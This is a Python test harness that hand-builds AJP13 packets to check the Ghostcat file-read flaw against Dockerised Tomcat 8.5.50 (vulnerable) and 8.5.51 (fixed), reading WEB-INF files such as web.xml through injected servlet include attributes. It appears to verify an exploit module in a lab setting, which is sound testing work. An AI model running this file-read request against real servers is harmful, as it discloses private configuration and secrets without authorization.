"""Independent AJP client for real Tomcat, using only Python's standard library.

Packet layouts: https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
The module and Rex AJP implementation are deliberately not imported here.
"""
import base64
import json
import os
import socket
import struct
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text()) if 'MODULE_TARGET_RUNTIME' in os.environ else None
compose = runtime['compose'] if runtime else ['docker', 'compose', '-p', sys.argv[1], '-f', str(Path(__file__).with_name('compose.yaml'))]
evidence = {'profiles': {}, 'commands': [], 'requests': []}


def command(*args):
    result = subprocess.run(compose + list(args), capture_output=True, timeout=30)
    evidence['commands'].append({'argv': compose + list(args), 'exitstatus': result.returncode,
                                 'stdout_base64': base64.b64encode(result.stdout).decode(), 'stderr': result.stderr.decode()})
    result.check_returncode()
    return result.stdout


def endpoint(service, port):
    host, value = command('port', service, str(port)).decode().strip().rsplit(':', 1)
    assert host == '127.0.0.1'
    return host, int(value)


def text(value):
    data = value.encode('utf-8')
    return struct.pack('!H', len(data)) + data + b'\0'


def exact(sock, count):
    data = bytearray()
    while len(data) < count:
        part = sock.recv(count - len(data))
        if not part:
            raise EOFError('Incomplete native AJP response')
        data.extend(part)
    return bytes(data)


def ajp(service, filename=None):
    # A real GET forwarded to Tomcat's default servlet. Include attributes are
    # supplied only for the file-read boundary; the ordinary control omits them.
    payload = b'\x02\x02' + b''.join(text(value) for value in ['HTTP/1.1', '/index.txt', '127.0.0.1', 'localhost', 'localhost'])
    payload += struct.pack('!HBH', 8080, 0, 1) + b'\xa0\x0b' + text('localhost')
    if filename is not None:
        for name, value in [('request_uri', '/index.txt'), ('path_info', filename), ('servlet_path', '/')]:
            payload += b'\x0a' + text('javax.servlet.include.' + name) + text(value)
    payload += b'\xff'
    request = b'\x12\x34' + struct.pack('!H', len(payload)) + payload
    packets = []
    body = bytearray()
    status = None
    with socket.create_connection(endpoint(service, 8009), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(request)
        for _ in range(100):
            header = exact(sock, 4)
            assert header[:2] == b'AB', header
            packet = exact(sock, struct.unpack('!H', header[2:])[0])
            packets.append(base64.b64encode(header + packet).decode())
            if packet[0] == 4:
                status = struct.unpack('!H', packet[1:3])[0]
            elif packet[0] == 3:
                count = struct.unpack('!H', packet[1:3])[0]
                assert len(packet) == count + 4 and packet[-1] == 0
                body.extend(packet[3:3 + count])
            elif packet[0] == 5:
                break
            else:
                raise ValueError('Unexpected native AJP packet: ' + str(packet[0]))
        else:
            raise ValueError('Native AJP exceeded bounded packet count')
    result = {'service': service, 'filename': filename, 'status': status,
              'body_base64': base64.b64encode(body).decode(), 'request_base64': base64.b64encode(request).decode(), 'packets_base64': packets}
    evidence['requests'].append(result)
    return status, bytes(body), packets


try:
    for service, version in [('vulnerable', '8.5.50'), ('fixed', '8.5.51')]:
        version_text = command('exec', '-T', service, 'sh', 'bin/version.sh').decode()
        assert 'Apache Tomcat/' + version in version_text
        profile = {'version': version, 'files': {}}
        evidence['profiles'][service] = profile
        host, port = endpoint(service, 8080)
        for path, expected in [('/index.txt', 200), ('/WEB-INF/short.txt', 404)]:
            try:
                response = urllib.request.urlopen(f'http://{host}:{port}{path}', timeout=5)
            except urllib.error.HTTPError as error:
                response = error
            body = response.read()
            evidence['requests'].append({'service': service, 'path': path, 'status': response.code, 'body_base64': base64.b64encode(body).decode()})
            assert response.code == expected
        status, body, _ = ajp(service)
        assert status == 200 and body == b'module-target-ghostcat-http\n'
        for name, filename in [('short', 'short.txt'), ('large', 'large.txt'), ('empty', 'empty.txt'), ('unicode', 'unicode.txt'), ('binary', 'binary.txt'), ('webxml', 'web.xml')]:
            expected = command('exec', '-T', service, 'cat', f'/usr/local/tomcat/webapps/ROOT/WEB-INF/{filename}')
            profile['files'][name] = base64.b64encode(expected).decode()
            status, body, packets = ajp(service, f'/WEB-INF/{filename}')
            if service == 'vulnerable':
                assert status == 200 and body == expected, (service, name, status, len(body), len(expected))
                if name == 'large':
                    assert len(packets) > 4
            else:
                assert status == 403 and b'module-target-record-' not in body
        status, _, _ = ajp(service, '/WEB-INF/module-target-missing.txt')
        # The affected DefaultServlet propagates a missing included resource
        # as HTTP 500; ordinary direct HTTP still protects WEB-INF with 404.
        assert status == (500 if service == 'vulnerable' else 403)
    host, port = endpoint('unrelated', 80)
    response = urllib.request.urlopen(f'http://{host}:{port}/', timeout=5)
    body = response.read()
    evidence['requests'].append({'service': 'unrelated', 'path': '/', 'status': response.code,
                                 'body_base64': base64.b64encode(body).decode()})
    assert response.code == 200 and b'module-target-http-marker' in body
finally:
    print(json.dumps(evidence, indent=2, ensure_ascii=False))
